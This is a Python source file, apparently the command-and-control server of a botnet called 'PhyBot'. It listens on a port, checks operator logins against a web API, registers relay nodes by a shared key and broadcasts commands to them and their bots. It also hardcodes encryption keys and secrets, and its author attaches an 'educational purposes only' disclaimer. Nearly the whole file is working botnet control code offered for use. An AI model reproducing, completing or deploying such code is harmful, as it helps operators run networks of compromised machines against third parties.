#!/usr/bin/python3

import socket
import threading
import sys
import time
from colorama import Fore, init
import hashlib
from cryptography.fernet import Fernet
import requests
from pystyle import Colors, Colorate
from modules.config import c2_config_addr as addrconf
from modules.loops import Loops as loop
from modules.client import Client as cl



__filename__="cnc"
__version__="2.0"
__author__="4lxprime"
__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
__infos__="This is a 'new version' of my old botnet B0T4N3T"



urlkey="VEIDVOE9oN8O3C4TnU2RIN1O0rF82mU6RuJwHFQ6GH5mF4NQ3pZ8Z6R7A8dL0"
relaykey="gAAAAABi2DQ2aBL7F1w-YK7tJQwZb_lnZY099Q2iCXqcLbLZy75ULiQk_VYWFglVco5PJrr0X-Jov_OaGwmL5HL5oYGqpACT7IiGspfgByyXQgY6U5an0Hk="
enckeyD="kg6QH9EBtZUziQ8DdEqwnCknt7lKTfpc2zEEvb3Imms="
passwd="b'gAAAAABixrd26TgeuuQmRhjWorB1oea-lO950B8hWYNHSTL2NvA3RW7A9MWAJXmDOeTJW9z5AWMp2pR0GHZqGPG36W2tXqPpLWkunwvc4CV8z5eJ0LNk5BU='"
api_url="http://localhost/phybot/api/v2"
fer=Fernet(enckeyD)
bots=[]
rbots=[
    {'ip': '127.0.0.1', 'bots': 0}
]
temprbots=[
    {'ip': '127.0.0.1', 'bots': 0}
]
relay={}
speed=[]
ansi_clear = '\033[2J\033[H'
w=Fore.GREEN
y=Fore.WHITE
r=Fore.RESET
rd=Fore.RED
banner=f"""
            dMMMMb     dMP dMP    dMP dMP     dMMMMb    .aMMMb  dMMMMMMP
           dMP.dMP    dMP dMP    dMP.dMP     dMP"dMP   dMP"dMP    dMP
          dMMMMP"    dMMMMMP     VMMMMP     dMMMMK"   dMP dMP    dMP
         dMP        dMP dMP    dA .dMP     dMP.aMF   dMP.aMP    dMP
        dWP        dEP dAP     VREAP"     dNONYP"    VMOUP"    dSP

                    C                N                C
"""
banner=Colorate.Horizontal(Colors.yellow_to_red, banner, 2)



def cryptD(msg: str, encde=True):
    if encde:
        msg=fer.encrypt(msg)
    else: 
        msg=fer.decrypt(msg)
    return msg



def find_login(username: str, password: str):
    password=hashlib.sha256(password.encode()).hexdigest()
    req=f"{api_url}/login.php?urlkey={urlkey}&usr={username}&pass={password}"
    print(f"\n\n{req}\n\n\n\n")
    r=requests.get(req).json()
    if r=="ok":
        return True
    else:
        return False


def send(socket, data: str, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())



def broadcast(data: str):
    print(f"send {data}")
    dead_relay = []
    for relays in list(relay):
        try:
            send(relays, f'{data}', False, False)
        except:
            dead_relay.append(relay)
    for relays in list(dead_relay):
        relay.pop(relays)
        relays.close()


def handle_client(client, address):

    while 1:
        send(client, ansi_clear, False)
        send(client, f'{y}Username{y} > ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{y}Password{y} > {Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break


    if password!=relaykey:
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, f'{rd}[{y}!{rd}]{r} Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=cl(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots, enckeyD=enckeyD).update_title, args=(client, username)).start()
        threading.Thread(target=cl(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots, enckeyD=enckeyD).command_line, args=(client, username)).start()
        
    elif password==relaykey:
        for x in relay.values():
            if x[0] == address[0]:
                client.close()
                return
        relay.update({client: address})
    
    else:
        client.close()



def main():
    if int(addrconf.cnc_p)!=0:
        port=addrconf.cnc_p

    else:
        if len(sys.argv) != 2:
            print(f'Usage: py {sys.argv[0]} <c&c port>')
            exit()

        port = sys.argv[1]
        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            print('Invalid C2 port')
            exit()
        port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    if loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).relay_api({'ip': '', 'bots': ''}, True):
        pass
    else:
        print('Failed to relay api')
        exit()

    sock.listen()
    
    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).ping).start()
    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).net).start()
    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).getbot).start()


    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    print(f"\nLegit: {__legit__}\n")
    main()